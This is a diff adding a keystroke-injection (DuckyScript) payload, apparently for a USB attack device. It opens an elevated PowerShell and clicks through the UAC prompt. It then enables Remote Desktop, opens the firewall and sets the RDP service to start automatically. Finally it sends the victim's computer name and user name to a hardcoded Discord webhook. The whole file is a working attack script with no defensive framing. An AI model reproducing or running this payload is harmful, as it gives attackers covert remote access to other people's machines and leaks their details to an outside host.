@@ -1,0 +1,63 @@
+DELAY 1000
+REM Open PowerShell as Administrator
+WINDOWS r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 500
+
+STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+ENTER
+DELAY 500
+
+STRING Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+ENTER
+DELAY 500
+
+
+STRING Start-Service -Name TermService
+ENTER
+DELAY 500
+
+STRING Set-Service -Name TermService -StartupType Automatic
+ENTER
+DELAY 500
+
+STRING Restart-Service -Name TermService
+ENTER
+DELAY 500
+
+STRING $pcName = $env:COMPUTERNAME
+ENTER
+DELAY 500
+STRING $username = $env:USERNAME
+ENTER
+DELAY 500
+
+STRING $webhookURL = "https://discord.com/api/webhooks/1193684469547278428/YoKr5YTacRFWDDQyhN2iD6wSKrn8vzuVehKYFzUPEcux5VzoYxTmfDBC2oUVrpEV2t1c"
+ENTER
+DELAY 500
+
+STRINGLN $content = @"
+STRINGLN **RDP Activated** :white_check_mark:
+STRINGLN **PC Name** = $pcName
+STRINGLN **Username** = $username
+STRINGLN "@
+ENTER
+DELAY 200
+
+REM Convert content to JSON payload
+STRING $payload = @{ content = $content } | ConvertTo-Json
+ENTER
+DELAY 200
+
+STRING Invoke-RestMethod -Uri $webhookURL -Method POST -ContentType "application/json" -Body $payload
+ENTER
+DELAY 500
+
+STRING exit
+ENTER
